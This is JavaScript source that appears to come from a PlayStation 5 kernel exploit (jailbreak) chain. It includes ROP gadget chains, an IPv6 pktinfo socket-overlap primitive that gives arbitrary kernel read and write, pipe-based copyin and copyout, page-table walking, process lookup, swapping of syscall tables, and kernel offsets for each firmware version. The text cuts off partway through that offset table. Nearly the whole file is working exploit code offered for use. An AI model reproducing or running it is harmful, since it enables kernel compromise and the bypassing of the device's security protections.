FW_VERSION = "";

PAGE_SIZE = 0x4000;
PHYS_PAGE_SIZE = 0x1000;

LIBKERNEL_HANDLE = 0x2001n;

MAIN_CORE = 4;
MAIN_RTPRIO = 0x100;
NUM_WORKERS = 2;
NUM_GROOMS = 0x200;
NUM_HANDLES = 0x100;
NUM_SDS = 64;
NUM_SDS_ALT = 48;
NUM_RACES = 100;
NUM_ALIAS = 100;
LEAK_LEN = 16;
NUM_LEAKS = 16;
NUM_CLOBBERS = 8;
MAX_AIO_IDS = 0x80;

AIO_CMD_READ = 1n;
AIO_CMD_FLAG_MULTI = 0x1000n;
AIO_CMD_MULTI_READ = 0x1001n;
AIO_CMD_WRITE = 2n;
AIO_STATE_COMPLETE = 3n;
AIO_STATE_ABORTED = 4n;        

SCE_KERNEL_ERROR_ESRCH = 0x80020003n;

RTP_SET = 1n;
PRI_REALTIME = 2n;

block_fd = 0xffffffffffffffffn;
unblock_fd = 0xffffffffffffffffn;
block_id = -1n;
groom_ids = null;
sds = null;
sds_alt = null;
prev_core = -1;
prev_rtprio = 0n;
ready_signal = 0n;
deletion_signal = 0n;
pipe_buf = 0n;

saved_fpu_ctrl = 0;
saved_mxcsr = 0;

function sysctlbyname(name, oldp, oldp_len, newp, newp_len) {
    const translate_name_mib = malloc(0x8);
    const buf_size = 0x70;
    const mib = malloc(buf_size);
    const size = malloc(0x8);
    
    write64_uncompressed(translate_name_mib, 0x300000000n);
    write64_uncompressed(size, BigInt(buf_size));
    
    const name_addr = alloc_string(name);
    const name_len = BigInt(name.length);
    
    if (syscall(SYSCALL.sysctl, translate_name_mib, 2n, mib, size, name_addr, name_len) === 0xffffffffffffffffn) {
        throw new Error("failed to translate sysctl name to mib (" + name + ")");
    }
    
    if (syscall(SYSCALL.sysctl, mib, 2n, oldp, oldp_len, newp, newp_len) === 0xffffffffffffffffn) {
        return false;
    }
    
    return true;
}

/***** misc.js *****/
function find_pattern(buffer, pattern_string) {
    const parts = pattern_string.split(' ');
    const matches = [];
    
    for (let i = 0; i <= buffer.length - parts.length; i++) {
        let match = true;
        
        for (let j = 0; j < parts.length; j++) {
            if (parts[j] === '?') continue;
            if (buffer[i + j] !== parseInt(parts[j], 16)) {
                match = false;
                break;
            }
        }
        
        if (match) matches.push(i);
    }
    
    return matches;
}

function get_fwversion() {
    const buf = malloc(0x8);
    const size = malloc(0x8);
    write64_uncompressed(size, 0x8n);
    
    if (sysctlbyname("kern.sdk_version", buf, size, 0n, 0n)) {
        const byte1 = Number(read8_uncompressed(buf + 2n));  // Minor version (first byte)
        const byte2 = Number(read8_uncompressed(buf + 3n));  // Major version (second byte)
        
        const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0');
        return version;
    }
    
    return null;
}

function call_pipe_rop(fildes) {

    write64(add_rop_smash_code_store, 0xab0025n);
    real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n;

    let rop_i = 0;
    
    fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
    fake_rop[rop_i++] = SYSCALL.pipe;
    fake_rop[rop_i++] = syscall_wrapper;
    
    // Store rax (read_fd) to fildes[0]
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = fildes;
    fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret
    
    // Store rdx (write_fd) to fildes[4]
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = fildes + 4n;
    fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rdx'); // mov qword [rdi], rdx ; ret
    
    // Return safe tagged value to JavaScript
    fake_rop[rop_i++] = g.get('pop_rax'); // mov rax, 0x200000000 ; ret
    fake_rop[rop_i++] = 0x2000n;                   // Fake value in RAX to make JS happy
    fake_rop[rop_i++] = g.get('pop_rsp_pop_rbp');
    fake_rop[rop_i++] = real_rbp;
    
    write64(add_rop_smash_code_store, 0xab00260325n);
    oob_arr[39] = base_heap_add + fake_frame;
    return rop_smash(obj_arr[0]);          // Call ROP
}

function create_pipe() {
    const fildes = malloc(0x10);
    
    call_pipe_rop(fildes);
    
    const read_fd = read32_uncompressed(fildes);
    const write_fd = read32_uncompressed(fildes + 4n);
    //logger.log("This are the created pipes: " + hex(read_fd) + " " + hex(write_fd));
    return [read_fd, write_fd];
}

function read_buffer(addr, len) {
    const buffer = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        buffer[i] = Number(read8_uncompressed(addr + BigInt(i)));
    }
    return buffer;
}

function write_buffer(addr, buffer) {
    for (let i = 0; i < buffer.length; i++) {
        write8_uncompressed(addr + BigInt(i), buffer[i]);
    }
}

function get_nidpath() {
    const path_buffer = malloc(0x255);
    const len_ptr = malloc(8);
    
    write64_uncompressed(len_ptr, 0x255n);
    
    const ret = syscall(SYSCALL.randomized_path, 0n, path_buffer, len_ptr);
    if (ret === 0xffffffffffffffffn) {
        throw new Error("randomized_path failed : " + hex(ret));        
    }
    
    return read_cstring(path_buffer);
}

function nanosleep(nsec) {
    const timespec = malloc(0x10);
    write64_uncompressed(timespec, BigInt(Math.floor(nsec / 1e9)));    // tv_sec
    write64_uncompressed(timespec + 8n, BigInt(nsec % 1e9));           // tv_nsec
    syscall(SYSCALL.nanosleep, timespec);
}

function is_jailbroken() {
    const cur_uid = syscall(SYSCALL.getuid);
    const is_in_sandbox = syscall(SYSCALL.is_in_sandbox);
    if (cur_uid === 0n && is_in_sandbox === 0n) {
        return true;
    } else {
        
        // Check if elfldr is running at 9021
        const sockaddr_in = malloc(16);
        const enable = malloc(4);
        
        const sock_fd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
        if (sock_fd === 0xffffffffffffffffn) {
            throw new Error("socket failed: " + hex(sock_fd));
        }
    
        try {
            write32_uncompressed(enable, 1);
            syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4n);
    
            write8_uncompressed(sockaddr_in + 1n, AF_INET);
            write16_uncompressed(sockaddr_in + 2n, 0x3D23n);      // port 9021
            write32_uncompressed(sockaddr_in + 4n, 0x0100007Fn);  // 127.0.0.1
    
            // Try to connect to 127.0.0.1:9021
            const ret = syscall(SYSCALL.connect, sock_fd, sockaddr_in, 16n);
    
            if (ret === 0n) {
                syscall(SYSCALL.close, sock_fd);
                return true;
            } else {
                syscall(SYSCALL.close, sock_fd);
                return false;
            }
        } catch (e) {
            syscall(SYSCALL.close, sock_fd);
            return false;
        }
    }
}

function check_jailbroken() {
    if (!is_jailbroken()) {
        throw new Error("process is not jailbroken")
    }
}

function file_exists(path) {
    const path_addr = alloc_string(path);
    const fd = syscall(SYSCALL.open, path_addr, O_RDONLY);
    
    if (fd !== 0xffffffffffffffffn) {
        syscall(SYSCALL.close, fd);
        return true;
    } else {
        return false;
    }
}

function write_file(path, text) {
    const mode = 0x1ffn; // 777
    const path_addr = alloc_string(path);
    const data_addr = alloc_string(text);

    const flags = O_CREAT | O_WRONLY | O_TRUNC;
    const fd = syscall(SYSCALL.open, path_addr, flags, mode);

    if (fd === 0xffffffffffffffffn) {
        throw new Error("open failed for " + path + " fd: " + hex(fd));
    }
    
    const written = syscall(SYSCALL.write, fd, data_addr, BigInt(text.length));
    if (written === 0xffffffffffffffffn) {
        syscall(SYSCALL.close, fd);
        throw new Error("write failed : " + hex(written));
    }

    syscall(SYSCALL.close, fd);
    return Number(written); // number of bytes written
}
/***** kernel.js *****/
kernel = {
    addr: {},
    copyout: null,
    copyin: null,
    read_buffer: null,
    write_buffer: null
};

kernel.read_byte = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 1);
    return value && value.length === 1 ? BigInt(value[0]) : null;
};

kernel.read_word = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 2);
    if (!value || value.length !== 2) return null;
    return BigInt(value[0]) | (BigInt(value[1]) << 8n);
};

kernel.read_dword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 4);
    if (!value || value.length !== 4) return null;
    let result = 0n;
    for (let i = 0; i < 4; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

kernel.read_qword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 8);
    if (!value || value.length !== 8) return null;
    let result = 0n;
    for (let i = 0; i < 8; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

kernel.read_null_terminated_string = function(kaddr) {
    //const decoder = new TextDecoder('utf-8');
    let result = "";
    
    while (true) {
        const chunk = kernel.read_buffer(kaddr, 0x8);
        if (!chunk || chunk.length === 0) break;
        
        let null_pos = -1;
        for (let i = 0; i < chunk.length; i++) {
            if (chunk[i] === 0) {
                null_pos = i;
                break;
            }
        }
        
        if (null_pos >= 0) {
            if (null_pos > 0) {
                for(let i = 0; i < null_pos; i++)
                {
                    result += String.fromCharCode(Number(chunk[i]));
                }
            }
            return result;
        }
        
        for(let i = 0; i < chunk.length; i++)
        {
            result += String.fromCharCode(Number(chunk[i]));
        }

        kaddr = kaddr + BigInt(chunk.length);
    }
    
    return result;
};

kernel.write_byte = function(dest, value) {
    const buf = new Uint8Array(1);
    buf[0] = Number(value & 0xFFn);
    kernel.write_buffer(dest, buf);
};

kernel.write_word = function(dest, value) {
    const buf = new Uint8Array(2);
    buf[0] = Number(value & 0xFFn);
    buf[1] = Number((value >> 8n) & 0xFFn);
    kernel.write_buffer(dest, buf);
};

kernel.write_dword = function(dest, value) {
    const buf = new Uint8Array(4);
    for (let i = 0; i < 4; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    kernel.write_buffer(dest, buf);
};

kernel.write_qword = function(dest, value) {
    const buf = new Uint8Array(8);
    for (let i = 0; i < 8; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    kernel.write_buffer(dest, buf);
};

ipv6_kernel_rw = {
    data: {},
    ofiles: null,
    kread8: null,
    kwrite8: null
};

ipv6_kernel_rw.init = function(ofiles, kread8, kwrite8) {
    ipv6_kernel_rw.ofiles = ofiles;
    ipv6_kernel_rw.kread8 = kread8;
    ipv6_kernel_rw.kwrite8 = kwrite8;
    
    ipv6_kernel_rw.create_pipe_pair();
    ipv6_kernel_rw.create_overlapped_ipv6_sockets();
};

ipv6_kernel_rw.get_fd_data_addr = function(fd) {
    const filedescent_addr = ipv6_kernel_rw.ofiles + BigInt(fd) * kernel_offset.SIZEOF_OFILES;
    const file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0n);
    return ipv6_kernel_rw.kread8(file_addr + 0x0n);
};

ipv6_kernel_rw.create_pipe_pair = function() {
    const [read_fd, write_fd] = create_pipe();
    
    ipv6_kernel_rw.data.pipe_read_fd = read_fd;
    ipv6_kernel_rw.data.pipe_write_fd = write_fd;
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd);
    ipv6_kernel_rw.data.pipemap_buffer = malloc(0x14);
    ipv6_kernel_rw.data.read_mem = malloc(PAGE_SIZE);
};

ipv6_kernel_rw.create_overlapped_ipv6_sockets = function() {
    const master_target_buffer = malloc(0x14);
    const slave_buffer = malloc(0x14);
    const pktinfo_size_store = malloc(0x8);
    
    write64_uncompressed(pktinfo_size_store, 0x14n);
    
    const master_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    const victim_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    
    syscall(SYSCALL.setsockopt, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14n);
    syscall(SYSCALL.setsockopt, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14n);
    
    const master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock);
    const master_pcb = ipv6_kernel_rw.kread8(master_so + kernel_offset.SO_PCB);
    const master_pktopts = ipv6_kernel_rw.kread8(master_pcb + kernel_offset.INPCB_PKTOPTS);
    
    const slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock);
    const slave_pcb = ipv6_kernel_rw.kread8(slave_so + kernel_offset.SO_PCB);
    const slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + kernel_offset.INPCB_PKTOPTS);
    
    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10n, slave_pktopts + 0x10n);
    
    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer;
    ipv6_kernel_rw.data.slave_buffer = slave_buffer;
    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store;
    ipv6_kernel_rw.data.master_sock = master_sock;
    ipv6_kernel_rw.data.victim_sock = victim_sock;
};

ipv6_kernel_rw.ipv6_write_to_victim = function(kaddr) {
    write64_uncompressed(ipv6_kernel_rw.data.master_target_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.master_target_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.master_target_buffer + 0x10n, 0n);
    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, 
            IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14n);
};

ipv6_kernel_rw.ipv6_kread = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    syscall(SYSCALL.getsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, 
            IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store);
};

ipv6_kernel_rw.ipv6_kwrite = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, 
            IPV6_PKTINFO, buffer_addr, 0x14n);
};

ipv6_kernel_rw.ipv6_kread8 = function(kaddr) {
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer);
    return read64_uncompressed(ipv6_kernel_rw.data.slave_buffer);
};

ipv6_kernel_rw.copyout = function(kaddr, uaddr, len) {
   if (kaddr === null || kaddr === undefined || 
       uaddr === null || uaddr === undefined || 
       len === null || len === undefined || len === 0n) {
       throw new Error("copyout: invalid arguments");
   }
    
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0x4000000040000000n);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);
    
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);
    
    syscall(SYSCALL.read, ipv6_kernel_rw.data.pipe_read_fd, uaddr, len);
};

ipv6_kernel_rw.copyin = function(uaddr, kaddr, len) {
   if (kaddr === null || kaddr === undefined || 
       uaddr === null || uaddr === undefined || 
       len === null || len === undefined || len === 0n) {
       throw new Error("copyout: invalid arguments");
   }
    
    
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0n);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);
    
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);
    
    syscall(SYSCALL.write, ipv6_kernel_rw.data.pipe_write_fd, uaddr, len);
};

ipv6_kernel_rw.read_buffer = function(kaddr, len) {
    let mem = ipv6_kernel_rw.data.read_mem;
    if (len > PAGE_SIZE) {
        mem = malloc(len);
    }
    
    ipv6_kernel_rw.copyout(kaddr, mem, BigInt(len));
    return read_buffer(mem, len);
};

ipv6_kernel_rw.write_buffer = function(kaddr, buf) {
    const temp_addr = malloc(buf.length);
    write_buffer(temp_addr, buf);
    ipv6_kernel_rw.copyin(temp_addr, kaddr, BigInt(buf.length));
};

// CPU page table definitions
CPU_PDE_SHIFT = {
    PRESENT: 0,
    RW: 1,
    USER: 2,
    WRITE_THROUGH: 3,
    CACHE_DISABLE: 4,
    ACCESSED: 5,
    DIRTY: 6,
    PS: 7,
    GLOBAL: 8,
    XOTEXT: 58,
    PROTECTION_KEY: 59,
    EXECUTE_DISABLE: 63
};

CPU_PDE_MASKS = {
    PRESENT: 1n,
    RW: 1n,
    USER: 1n,
    WRITE_THROUGH: 1n,
    CACHE_DISABLE: 1n,
    ACCESSED: 1n,
    DIRTY: 1n,
    PS: 1n,
    GLOBAL: 1n,
    XOTEXT: 1n,
    PROTECTION_KEY: 0xfn,
    EXECUTE_DISABLE: 1n
};

CPU_PG_PHYS_FRAME = 0x000ffffffffff000n;
CPU_PG_PS_FRAME = 0x000fffffffe00000n;

function cpu_pde_field(pde, field) {
    const shift = CPU_PDE_SHIFT[field];
    const mask = CPU_PDE_MASKS[field];
    return Number((pde >> BigInt(shift)) & mask);
}

function cpu_walk_pt(cr3, vaddr) {
    if (!vaddr || !cr3) {
        throw new Error("cpu_walk_pt: invalid arguments");
    }
    
    const pml4e_index = (vaddr >> 39n) & 0x1ffn;
    const pdpe_index = (vaddr >> 30n) & 0x1ffn;
    const pde_index = (vaddr >> 21n) & 0x1ffn;
    const pte_index = (vaddr >> 12n) & 0x1ffn;
    
    const pml4e = kernel.read_qword(phys_to_dmap(cr3) + pml4e_index * 8n);
    if (cpu_pde_field(pml4e, "PRESENT") !== 1) {
        return null;
    }
    
    const pdp_base_pa = pml4e & CPU_PG_PHYS_FRAME;
    const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
    const pdpe = kernel.read_qword(pdpe_va);
    
    if (cpu_pde_field(pdpe, "PRESENT") !== 1) {
        return null;
    }
    
    const pd_base_pa = pdpe & CPU_PG_PHYS_FRAME;
    const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
    const pde = kernel.read_qword(pde_va);
    
    if (cpu_pde_field(pde, "PRESENT") !== 1) {
        return null;
    }
    
    if (cpu_pde_field(pde, "PS") === 1) {
        return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1fffffn);
    }
    
    const pt_base_pa = pde & CPU_PG_PHYS_FRAME;
    const pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
    const pte = kernel.read_qword(pte_va);
    
    if (cpu_pde_field(pte, "PRESENT") !== 1) {
        return null;
    }
    
    return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3fffn);
}

function is_kernel_rw_available() {
    return kernel.read_buffer && kernel.write_buffer;
}

function check_kernel_rw() {
    if (!is_kernel_rw_available()) {
        throw new Error("kernel r/w is not available");
    }
}

function find_proc_by_name(name) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }
    
    let proc = kernel.read_qword(kernel.addr.allproc);
    while (proc !== 0n) {
        const proc_name = kernel.read_null_terminated_string(proc + kernel_offset.PROC_COMM);
        if (proc_name === name) {
            return proc;
        }
        proc = kernel.read_qword(proc + 0x0n);
    }
    
    return null;
}

function find_proc_by_pid(pid) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }
    
    const target_pid = BigInt(pid);
    let proc = kernel.read_qword(kernel.addr.allproc);
    while (proc !== 0n) {
        const proc_pid = kernel.read_dword(proc + kernel_offset.PROC_PID);
        if (proc_pid === target_pid) {
            return proc;
        }
        proc = kernel.read_qword(proc + 0x0n);
    }
    
    return null;
}

function get_proc_cr3(proc) {
    check_kernel_rw();
    
    const vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE);
    const pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP);
    
    return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3);
}

function virt_to_phys(virt_addr, cr3) {
    check_kernel_rw();
    if (!kernel.addr.dmap_base || !virt_addr) {
        throw new Error("virt_to_phys: invalid arguments");
    }
    
    cr3 = cr3 || kernel.addr.kernel_cr3;
    return cpu_walk_pt(cr3, virt_addr);
}

function phys_to_dmap(phys_addr) {
    if (!kernel.addr.dmap_base || !phys_addr) {
        throw new Error("phys_to_dmap: invalid arguments");
    }
    return kernel.addr.dmap_base + phys_addr;
}

// Replace curproc sysent with sysent of other PS5 process
// Note: failure to restore curproc sysent will have side effect on the game/PS
function run_with_ps5_syscall_enabled(f) {
    check_kernel_rw();
    
    const target_proc_name = "SceGameLiveStreaming"; // arbitrarily chosen PS5 process
    
    const target_proc = find_proc_by_name(target_proc_name);
    if (!target_proc) {
        throw new Error("failed to find proc addr of " + target_proc_name);
    }
    
    const cur_sysent = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_SYSENT);  // struct sysentvec
    const target_sysent = kernel.read_qword(target_proc + kernel_offset.PROC_SYSENT);
    
    const cur_table_size = kernel.read_dword(cur_sysent); // sv_size
    const target_table_size = kernel.read_dword(target_sysent);
    
    const cur_table = kernel.read_qword(cur_sysent + 0x8n); // sv_table
    const target_table = kernel.read_qword(target_sysent + 0x8n);
    
    // Replace with target sysent
    kernel.write_dword(cur_sysent, target_table_size);
    kernel.write_qword(cur_sysent + 0x8n, target_table);
    
    try {
        f();
    } catch (e) {
        logger.log('run_with_ps5_syscall_enabled failed : ' + e.message);
        logger.log(e.stack);
    } finally {
        // Always restore back
        kernel.write_dword(cur_sysent, cur_table_size);
        kernel.write_qword(cur_sysent + 0x8n, cur_table);
    }
}

/***** kernel_offset.js *****/
offset_4_00_to_4_51 = {
    DATA_BASE: 0x0C00000n,
    DATA_SIZE: 0x087B1930n,
    DATA_BASE_DYNAMIC: 0x00010000n,
    DATA_BASE_TO_DYNAMIC: 0x0670DB90n,
    DATA_BASE_ALLPROC: 0x027EDCB8n,
    DATA_BASE_SECURITY_FLAGS: 0x06506474n,
    DATA_BASE_ROOTVNODE: 0x066E74C0n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x03257A78n,
    DATA_BASE_DATA_CAVE: 0x06C01000n,  // Unconfirmed
    DATA_BASE_GVMSPACE: 0x064C3F80n,
    PMAP_STORE_PML4PML4I: -0x1Cn,
    PMAP_STORE_DMPML4I: 0x288n,
    PMAP_STORE_DMPDPI: 0x28Cn,
};

offset_5_00_to_5_10 = {
    DATA_BASE: 0x0C40000n,
    DATA_SIZE: 0x08921930n,
    DATA_BASE_DYNAMIC: 0x00010000n,
    DATA_BASE_TO_DYNAMIC: 0x06879C00n,
    DATA_BASE_ALLPROC: 0x0291DD00n,
    DATA_BASE_SECURITY_FLAGS: 0x066466ECn,
    DATA_BASE_ROOTVNODE: 0x06853510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x03398A88n,
    DATA_BASE_DATA_CAVE: 0x06320000n,  // Unconfirmed
    DATA_BASE_GVMSPACE: 0x06603FB0n,
    PMAP_STORE_PML4PML4I: -0x105Cn,
    PMAP_STORE_DMPML4I: 0x29Cn,
    PMAP_STORE_DMPDPI: 0x2A0n,
};

offset_5_50 = {
    DATA_BASE: 0x0C40000n,
    DATA_SIZE: 0x08921930n,
    DATA_BASE_DYNAMIC: 0x00010000n,
    DATA_BASE_TO_DYNAMIC: 0x06879C00n,
    DATA_BASE_ALLPROC: 0x0291DD00n,
    DATA_BASE_SECURITY_FLAGS: 0x066466ECn,
    DATA_BASE_ROOTVNODE: 0x06853510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x03394A88n,
    DATA_BASE_DATA_CAVE: 0x06320000n,  // Unconfirmed
    DATA_BASE_GVMSPACE: 0x06603FB0n,
    PMAP_STORE_PML4PML4I: -0x105Cn,
    PMAP_STORE_DMPML4I: 0x29Cn,
    PMAP_STORE_DMPDPI: 0x2A0n,
};

offset_6_00_to_6_50 = {
    DATA_BASE: 0x0C60000n,  // Unconfirmed
    DATA_SIZE: 0x08861930n,
    DATA_BASE_DYNAMIC: 0x00010000n,
    DATA_BASE_TO_DYNAMIC: 0x067C5C10n,
    DATA_BASE_ALLPROC: 0x02869D20n,
    DATA_BASE_SECURITY_FLAGS: 0x065968ECn,
    DATA_BASE_ROOTVNODE: 0x0679F510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x032E4358n,
    DATA_BASE_DATA_CAVE: 0x06270000n,  // Unconfirmed
    DATA_BASE_GVMSPACE: 0x065540F0n,
    PMAP_STORE_PML4PML4I: -0x105Cn,
    PMAP_STORE_DMPML4I: 0x29Cn,
    PMAP_STORE_DMPDPI: 0x2A0n,
};

offset_7_00_to_7_61 = {
    DATA_BASE: 0x0C50000n,
    DATA_SIZE: 0x05191930n,
    DATA_BASE_DYNAMIC: 0x00010000n,
    DATA_BASE_TO_DYNAMIC: 0x030EDC40n,
    DATA_BASE_ALLPROC: 0x02859D50n,
    DATA_BASE_SECURITY_FLAGS: 0x00AC8064n,
    DATA_BASE_ROOTVNODE: 0x030C7510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x02E2C848n,
    DATA_BASE_DATA_CAVE: 0x050A1000n,  // Unconfirmed
    DATA_BASE_GVMSPACE: 0x02E76090n,
    PMAP_STORE_PML4PML4I: -0x10ACn,
    PMAP_STORE_DMPML4I: 0x29Cn,
    PMAP_STORE_DMPDPI: 0x2A0n,
};

offset_8_00_to_8_60 = {
    DATA_BASE: 0xC70000n,
    DATA_SIZE: null,
    DATA_BASE_DYNAMIC: 0x10000n,
    DATA_BASE_TO_DYNAMIC: null,
    DATA_BASE_ALLPROC: 0x2875D50n,
    DATA_BASE_SECURITY_FLAGS: 0xAC3064n,
    DATA_BASE_ROOTVNODE: 0x30FB510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x2E48848n,
    DATA_BASE_DATA_CAVE: null,
    DATA_BASE_GVMSPACE: 0x2EAA090n,
    PMAP_STORE_PML4PML4I: null,
    PMAP_STORE_DMPML4I: null,
    PMAP_STORE_DMPDPI: null,
};

offset_9_00 = {
    DATA_BASE: 0xCA0000n,
    DATA_SIZE: null,
    DATA_BASE_DYNAMIC: 0x10000n,
    DATA_BASE_TO_DYNAMIC: null,
    DATA_BASE_ALLPROC: 0x2755D50n,
    DATA_BASE_SECURITY_FLAGS: 0xD72064n,
    DATA_BASE_ROOTVNODE: 0x2FDB510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x2D28B78n,
    DATA_BASE_DATA_CAVE: null,
    DATA_BASE_GVMSPACE: 0x2D8A570n,
    PMAP_STORE_PML4PML4I: null,
    PMAP_STORE_DMPML4I: null,
    PMAP_STORE_DMPDPI: null,
};

offset_9_05_to_9_60 = {
    DATA_BASE: 0xCA0000n,
    DATA_SIZE: null,
    DATA_BASE_DYNAMIC: 0x10000n,
    DATA_BASE_TO_DYNAMIC: null,
    DATA_BASE_ALLPROC: 0x2755D50n,
    DATA_BASE_SECURITY_FLAGS: 0xD73064n,
    DATA_BASE_ROOTVNODE: 0x2FDB510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x2D28B78n,
    DATA_BASE_DATA_CAVE: null,
    DATA_BASE_GVMSPACE: 0x2D8A570n,
    PMAP_STORE_PML4PML4I: null,
    PMAP_STORE_DMPML4I: null,
    PMAP_STORE_DMPDPI: null,
};

offset_10_00_to_10_01 = {
    DATA_BASE: 0xCC0000n,
    DATA_SIZE: null,
    DATA_BASE_DYNAMIC: 0x10000n,
    DATA_BASE_TO_DYNAMIC: null,
    DATA_BASE_ALLPROC: 0x2765D70n,
    DATA_BASE_SECURITY_FLAGS: 0xD79064n,
    DATA_BASE_ROOTVNODE: 0x2FA3510n,
    DATA_BASE_KERNEL_PMAP_STORE: 0x2CF0EF8n,
    DATA_BASE_DATA_CAVE: null,
    DATA_BASE_GVMSPACE: 0x2D52570n,
    PMAP_STORE_PML4PML4I: null,
    PMAP_STORE_DMPML4I: null,
    PMAP_STORE_DMPDPI: null,
};

// Map firmware versions to shared offset objects
ps5_kernel_offset_list = {
    "4.00": offset_4_00_to_4_51,
    "4.02": offset_4_00_to_4_51,
    "4.03": offset_4_00_to_4_51,
    "4.50": offset_4_00_to_4_51,
    "4.51": offset_4_00_to_4_51,
    "5.00": offset_5_00_to_5_10,
    "5.02": offset_5_00_to_5_10,
    "5.10": offset_5_00_to_5_10,
    "5.50": offset_5_50,
    "6.00": offset_6_00_to_6_50,
    "6.02": offset_6_00_to_6_50,
    "6.50": offset_6_00_to_6_50,
    "7.00": offset_7_00_to_7_61,
    "7.01": offset_7_00_to_7_61,
    "7.20": offset_7_00_to_7_61,
    "7.40": offset_7_00_to_7_61,
    "7.60": offset_7_00_to_7_61,
    "7.61": offset_7_00_to_7_61,
    "8.00": offset_8_00_to_8_60,
    "8.20": offset_8_00_to_8_60,
    "8.40": offset_8_00_to_8_60,
    "8.60": offset_8_00_to_8_60,
    "9.00": offset_9_00,
    "9.05": offset_9_05_to_9_60,
    "9.20": offset_9_05_to_9_60,
    "9.40": offset_9_05_to_9_60,
